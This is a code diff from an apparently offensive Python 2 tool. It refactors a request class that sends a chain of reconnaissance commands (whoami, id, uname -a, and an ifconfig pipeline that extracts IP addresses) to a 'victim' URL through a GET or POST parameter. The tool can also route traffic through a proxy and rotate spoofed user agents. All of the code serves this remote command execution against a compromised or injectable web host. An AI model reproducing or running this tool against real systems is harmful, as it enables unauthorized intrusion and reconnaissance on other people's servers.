@@ -3,12 +3,6 @@ from urllib2 import ProxyHandler, build_opener, install_opener
 from menu import getargs, Colors
 from random import randint
 
-url = getargs.url
-method = getargs.method
-parameter = getargs.parameter
-proxy = getargs.proxy
-user_agent = getargs.agent
-random_agent = getargs.random_agent
 USER_AGENTS = [
         "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; Crazy Browser 1.0.5)",
         "curl/7.7.2 (powerpc-apple-darwin6.0) libcurl 7.7.2 (OpenSSL 0.9.6b)",
@@ -35,9 +29,12 @@ class MakeRequest(object):
     self.info in VictimBox class 'victim_info.py'
     '''
     def __init__(self, url=None, method='get', parameter=None):
-        self.url = url
-        self.method = method
-        self.parameter = parameter
+        self.url = getargs.url
+        self.method = getargs.method
+        self.parameter = getargs.parameter
+        self.proxy = getargs.proxy
+        self.user_agent = getargs.agent
+        self.random_agent = getargs.random_agent
         self.cmd = 'whoami;'
         self.cmd += 'id;'
         self.cmd += 'uname -a;'
@@ -46,32 +43,34 @@ class MakeRequest(object):
         self.cmd += '/sbin/ifconfig |grep -B1 "inet addr" |awk \'{ if ( $1 == "inet" ) { print $2 } else if ( $2 == "Link" ) { printf "%s:" ,$1 } }\' |awk -F: \'{ print $3 }\''
 
     def get_page_source(self):
-        proxy_support = ProxyHandler({'http': proxy} if proxy else {})
+        proxy_support = ProxyHandler({'http': self.proxy} if self.proxy else {})
         opener = build_opener(proxy_support)
-        if random_agent:
+        if self.random_agent:
             opener.addheaders = [('User-agent', USER_AGENTS[randint(0, len(USER_AGENTS) - 1)])]
-        elif user_agent:
-            opener.addheaders = [('User-agent', user_agent)]
+        elif self.user_agent:
+            opener.addheaders = [('User-agent', self.user_agent)]
         else:
             pass
         install_opener(opener)
         errmsg = '\n{0}[!] Check your connection or the proxy if you\'re using it{1}'.format(Colors.RED, Colors.END)
         # check if the method is post or get
-        if method == 'post' or parameter:
-            parameters = urlencode({parameter: self.cmd})
+        if self.method == 'post' or self.parameter:
+            self.method = 'post'
+            parameters = urlencode({self.parameter: self.cmd})
             try:
-                sc = opener.open(url, parameters)
+                sc = opener.open(self.url, parameters)
                 return sc
-            except:
-                print errmsg
+            except Exception, e:
+                print errmsg, e
                 exit(1)
         # if the used method set get
         else:
             try:
-                sc = opener.open('{}{}'.format(url, quote(self.cmd)))
+                sc = opener.open('{}{}'.format(self.url, quote(self.cmd)))
                 return sc
-            except:
-                print errmsg
+            except Exception, e:
+                print self.url, self.cmd  # , self.cmd, self.parameter, self.method
+                print errmsg, e
                 exit(1)
 
 make_request = MakeRequest()
